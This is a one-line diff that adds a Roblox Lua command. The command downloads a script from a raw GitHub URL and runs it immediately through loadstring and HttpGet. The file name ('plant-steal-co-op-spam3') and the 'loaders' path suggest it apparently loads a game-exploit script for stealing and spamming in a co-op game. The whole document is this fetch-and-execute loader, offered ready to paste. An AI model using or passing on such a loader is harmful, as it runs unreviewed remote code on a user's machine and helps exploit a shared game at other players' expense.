@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/plant-steal-co-op-spam3-f0shq2llm0h2pj.lua"))()
